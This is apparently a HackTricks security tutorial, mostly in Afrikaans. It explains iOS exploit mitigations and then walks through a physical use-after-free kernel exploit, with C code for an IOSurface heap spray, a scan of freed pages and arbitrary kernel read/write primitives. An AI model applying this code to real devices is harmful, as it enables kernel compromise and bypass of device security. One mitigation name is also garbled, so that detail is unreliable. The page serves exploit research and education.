# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## iOS Exploit Mitigations

- **Code Signing** in iOS werk deur te vereis dat elke stukkie uitvoerbare kode (apps, libraries, extensions, ens.) kriptografies geteken is met ’n sertifikaat uitgegee deur Apple. Wanneer kode gelaai word, verifieer iOS die digitale handtekening teen Apple se vertroude root. As die handtekening ongeldig, afwesig of gemodifiseer is, weier die OS om dit uit te voer. Dit verhoed dat aanvallers kwaadwillige kode in regmatige apps inprop of unsigned binaries laat loop, en blokkeer dus die meeste exploit-kettings wat staatmaak op die uitvoering van ewekansige of veranderde kode.
- **CoreTrust** is die iOS substelsel wat code signing by runtime afdwing. Dit verifieer handtekeninge direk met Apple se rootsertifikaat sonder om op gecachte trust stores te staatmaak, wat beteken dat slegs binaries wat deur Apple geteken is (of met geldige entitlements) kan uitvoering kry. CoreTrust verseker dat selfs as ’n aanvaller ’n app na installasie manipuleer, stelselbiblioteke verander of probeer om unsigned code te laai, die stelsel die uitvoering sal blokkeer tensy die kode steeds korrek geteken is. Hierdie streng afdwinging sluit baie post-exploitation vektore wat ouer iOS-weergawes met swakker of omseilbare handtekeningkontroles toegelaat het.
- **Data Execution Prevention (DEP)** merk geheuegebiede as nie-uitvoerbaar tensy dit duidelik kode bevat. Dit keer dat aanvallers shellcode in datagebiede (soos die stack of heap) inprop en dit uitvoer, en dwing hulle om meer komplekse tegnieke soos ROP (Return-Oriented Programming) te gebruik.
- **ASLR (Address Space Layout Randomization)** randomiseer die geheueadresse van kode, libraries, stack en heap elke keer as die stelsel loop. Dit maak dit veel moeiliker vir aanvallers om te voorspel waar nuttige instruksies of gadgets is, en breek baie exploit-kettings wat op vaste geheue-lay-outs staatmaak.
- **KASLR (Kernel ASLR)** pas dieselfde randomisasiekonsep toe op die iOS-kernel. Deur die kernel se basisadres by elke boot te skud, verhoed dit dat aanvallers betroubaar kernel-funksies of strukture lok, wat die moeilikheidsgraad van kernelvlak-exploits verhoog wat andersins volle stelselbeheer sou gee.
- **Kernel Patch Protection (KPP)**, ook bekend as **AMCC (Apple Mobile File Integrity)** in iOS, monitor voortdurend die kernel se kodebladsye om te verseker dat dit nie gewysig is nie. As enige manipulasie opgespoor word—soos ’n exploit wat kernel-funksies probeer patch of kwaadwillige kode invoeg—sal die toestel onmiddellik panic en herlaai. Hierdie beskerming maak volhoubare kernel-exploits baie moeiliker, aangesien aanvallers nie net kernel-instruksies kan hook of patch sonder om ’n stelselcrash te veroorsaak nie.
- **Kernel Text Readonly Region (KTRR)** is ’n hardware-gebaseerde sekuriteitsfunksie wat op iOS-toestelle ingeval is. Dit gebruik die CPU se geheuebeheerder om die kernel se kode (text) afdeling permanent as read-only na boot te merk. Sodra dit gesluit is, kan selfs die kernel self nie hierdie geheuegebied wysig nie. Dit verhoed dat aanvallers—en selfs bevoorregte kode—kernel-instruksies by runtime patch, wat ’n groot klas exploits toemaak wat gebaseer was op direkte wysiging van kernel-kode.
- **Pointer Authentication Codes (PAC)** gebruik kriptografiese handtekeninge ingebed in ongebruikte biete van pointers om hul integriteit te verifieer voordat dit gebruik word. Wanneer ’n pointer (soos ’n return address of funksiepointer) geskep word, teken die CPU dit met ’n geheime sleutel; voor dereferensie kontroleer die CPU die handtekening. As die pointer gemanipuleer is, misluk die kontrole en stop uitvoering. Dit verhoed dat aanvallers pointers forgery of hergebruik in geheue-korrupsie-exploits, en maak tegnieke soos ROP of JOP baie moeiliker om betroubaar uit te voer.
- **Privilege Access never (PAN)** is ’n hardware-funksie wat verhoed dat die kernel (bevoorregte modus) direk user-space geheue benader tensy dit uitdruklik toegang toelaat. Dit stop aanvallers wat kernel-code-uitvoering verkry het om maklik user-memory te lees of te skryf om exploits te eskaleer of sensitiewe data te steel. Deur noue skeiding af te dwing verminder PAN die impak van kernel-exploits en blokkeer baie algemene privilege-escalation-tegnieke.
- **Page Protection Layer (PPL)** is ’n iOS-sekuriteitsmeganisme wat kritiese kernel-beheerde geheuegebiede beskerm, veral dié wat verband hou met code signing en entitlements. Dit handhaaf streng skryfbeskermings met behulp van die MMU (Memory Management Unit) en addisionele kontroles, en verseker dat selfs bevoorregte kernel-kode nie lukraak sensitiewe bladsye kan wysig nie. Dit verhoed dat aanvallers wat kernelvlak-uitvoering kry, sekuriteit-kritieke strukture manipuleer, wat persistentie en code-signing-omseilings aansienlik moeiliker maak.


## Physical use-after-free

This is a summary from the post from [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) moreover further information about exploit using this technique can be found in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Geheuebestuur in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Die **virtual memory address space** vir user-processes op iOS strek van **0x0 to 0x8000000000**. Hierdie adresse kaart egter nie direk na fisiese geheue nie. In plaas daarvan gebruik die **kernel** **page tables** om virtuele adresse na werklike **physical addresses** te vertaal.

#### Vlakke van bladsytabelle in iOS

Bladsytabelle is hiërargies in drie vlakke georganiseer:

1. **L1 Page Table (Level 1)**:
* Elke entiteit hier verteenwoordig ’n groot reeks virtuele geheue.
* Dit dek **0x1000000000 bytes** (of **256 GB**) van virtuele geheue.
2. **L2 Page Table (Level 2)**:
* ’n Entiteit hier verteenwoordig ’n kleiner streek van virtuele geheue, spesifiek **0x2000000 bytes** (32 MB).
* ’n L1-entiteit kan na ’n L2-tabel wys as dit nie die hele streek self kan map nie.
3. **L3 Page Table (Level 3)**:
* Dit is die fynste vlak, waar elke entiteit ’n enkele **4 KB** geheuebladsy map.
* ’n L2-entiteit kan na ’n L3-tabel wys as meer gedetailleerde beheer benodig word.

#### Mapping van virtueel na fisies geheue

* **Direct Mapping (Block Mapping)**:
* Sommige entiteite in ’n bladsytabel kaart ’n reeks virtuele adresse direk na ’n aaneenlopende reeks fisiese adresse (soos ’n kortpad).
* **Pointer to Child Page Table**:
* As fynere beheer benodig word, kan ’n entiteit op een vlak (bv. L1) na ’n **child page table** op die volgende vlak (bv. L2) wys.

#### Voorbeeld: Mapping van ’n Virtuele Adres

Kom ons sê jy probeer toegang kry tot die virtuele adres **0x1000000000**:

1. **L1 Table**:
* Die kernel kyk die L1 bladsytabel-entiteit na wat ooreenstem met hierdie virtuele adres. As dit ’n **pointer to an L2 page table** het, gaan dit na daardie L2-tabel.
2. **L2 Table**:
* Die kernel kyk die L2 bladsytabel vir ’n meer gedetailleerde mapping. As hierdie entiteit na ’n **L3 page table** wys, gaan dit verder daarheen.
3. **L3 Table**:
* Die kernel soek die finale L3-entiteit, wat na die **physical address** van die werklike geheuebladsy wys.

#### Voorbeeld van adres-mapping

As jy die fisiese adres **0x800004000** in die eerste indeks van die L2-tabel skryf, dan:

* Virtuele adresse van **0x1000000000** tot **0x1002000000** map na fisiese adresse van **0x800004000** tot **0x802004000**.
* Dit is ’n **block mapping** op die L2-vlak.

Alternatiewelik, as die L2-entiteit na ’n L3-tabel wys:

* Elke 4 KB bladsy in die virtuele adresreeks **0x1000000000 -> 0x1002000000** sou deur individuele entiteite in die L3-tabel gemap word.

### Physical use-after-free

’n **Physical use-after-free (UAF)** gebeur wanneer:

1. ’n proses iets geheue **allocates** as **readable and writable**.
2. Die **page tables** word opgedateer om hierdie geheue na ’n spesifieke fisiese adres te map wat die proses kan benader.
3. Die proses **deallocates** (free) die geheue.
4. Vanweë ’n **bug**, vergeet die kernel egter om die mapping uit die page tables te verwyder, al merk dit die ooreenstemmende fisiese geheue as vry.
5. Die kernel kan dan hierdie “vrygestelde” fisiese geheue **reallocate** vir ander doeleindes, soos **kernel data**.
6. Aangesien die mapping nie verwyder is nie, kan die proses steeds **read en write** na hierdie fisiese geheue.

Dit beteken die proses kan toegang kry tot **bladsye van kernel geheue**, wat sensitiewe data of strukture kan bevat, en moontlik ’n aanvaller toelaat om **kernel geheue te manipuleer**.

### IOSurface Heap Spray

Aangesien die aanvaller nie die spesifieke kernel-bladsye wat aan vrygestelde geheue toegeken sal word kan beheer nie, gebruik hulle ’n tegniek genoem **heap spray**:

1. Die aanvaller skep ’n groot aantal IOSurface objects in kernel-geheue.
2. Elke IOSurface object bevat ’n **magic value** in een van sy velde, wat dit maklik maak om te identifiseer.
3. Hulle **scan die vrygestelde bladsye** om te kyk of enige van hierdie IOSurface objects op ’n vrygestelde bladsy beland het.
4. Wanneer hulle ’n IOSurface object op ’n vrygestelde bladsy vind, kan hulle dit gebruik om **kernel geheue te lees en te skryf**.

More info about this in [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Wees bewus dat iOS 16+ (A12+) devices hardware-mitigations (soos PPL of SPTM) meebring wat physical UAF-tegnieke baie minder uitvoerbaar maak.
> PPL dwing streng MMU-beskermings af op bladsye wat verband hou met code signing, entitlements, en sensitiewe kernel-data, so selfs as ’n bladsy hergebruik word, word skrywe vanaf userland of gekompromitteerde kernel-kode na PPL-beskermde bladsye geblokkeer.
> Secure Page Table Monitor (SPTM) brei PPL uit deur page table updates self te verskerp. Dit verseker dat selfs bevoorregte kernel-kode nie stilweg vrygestelde bladsye kan herkaart of mappings kan manipuleer sonder om deur veilige kontroles te gaan nie.
> KTRR (Kernel Text Read-Only Region) sluit die kernel se kodeafdeling as read-only na boot. Dit verhoed enige runtime-wysigings aan kernel-kode, wat ’n groot aanvalsvlak sluit waarop physical UAF-exploits dikwels staatmaak.
> Verder is IOSurface-allocations minder voorspelbaar en moeiliker om na user-accessible streke te map, wat die “magic value scanning” truuk baie minder betroubaar maak. En IOSurface is nou beveilig deur entitlements en sandbox-beperkings.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: Die aanvaller skep baie IOSurface objects met ’n spesiale identifiseerder ("magic value").
2. **Scan Freed Pages**: Hulle kontroleer of enige van die objects op ’n vrygestelde bladsy toegeken is.
3. **Read/Write Kernel Memory**: Deur velde in die IOSurface object te manipuleer, kry hulle die vermoë om **arbitrary reads and writes** in kernel-geheue uit te voer. Dit laat hulle toe om:
* Een veld te gebruik om **enige 32-bit waarde** in kernel-geheue te lees.
* ’n Ander veld te gebruik om **64-bit waardes** te skryf, wat ’n stabiele **kernel read/write primitive** bewerkstellig.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Soek na **`IOSurface`** voorwerpe in 'n bevryde fisiese bladsy:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Bereik Kernel Lees/Skryf met IOSurface

Nadat beheer oor 'n IOSurface-objek in kernel-geheue bereik is (gemap na 'n vrygemaakte fisiese bladsy wat vanaf userspace toeganklik is), kan ons dit gebruik vir **arbitrêre kernel lees- en skryf-operasies**.

**Belangrike velde in IOSurface**

Die IOSurface-objek het twee beslissende velde:

1. **Use Count Pointer**: Laat 'n **32-bit lees** toe.
2. **Indexed Timestamp Pointer**: Laat 'n **64-bit skryf** toe.

Deur hierdie pointers te oorskryf, herlei ons hulle na arbitrêre adresse in kernel-geheue, wat lees-/skryfvermoëns moontlik maak.

#### 32-Bit Kernel Lees

Om 'n lees uit te voer:

1. Oorskryf die **use count pointer** sodat dit na die teikenadres wys minus 'n 0x14-byte offset.
2. Gebruik die `get_use_count` method om die waarde by daardie adres te lees.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Om 'n skrywing uit te voer:

1. Oorskryf die **indexed timestamp pointer** na die teikenadres.
2. Gebruik die `set_indexed_timestamp` metode om 'n 64-bit waarde te skryf.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Opsomming van die Exploit-vloei

1. **Trigger Physical Use-After-Free**: Vrye bladsye is beskikbaar vir hergebruik.
2. **Spray IOSurface Objects**: Ken baie IOSurface objects toe met 'n unieke "magic value" in kernel memory.
3. **Identify Accessible IOSurface**: Vind 'n IOSurface op 'n vrygemaakte bladsy wat jy beheer.
4. **Abuse Use-After-Free**: Wysig pointere in die IOSurface object om arbitrêre **kernel read/write** via IOSurface-metodes moontlik te maak.

Met hierdie primitiewe voorsien die exploit beheerde **32-bit reads** en **64-bit writes** na kernel memory. Verdere jailbreak-stappe kan meer stabiele read/write-primitiewe vereis, wat die omseiling van addisionele beskermings kan benodig (bv. PPL op nuwer arm64e-toestelle).

{{#include ../../banners/hacktricks-training.md}}
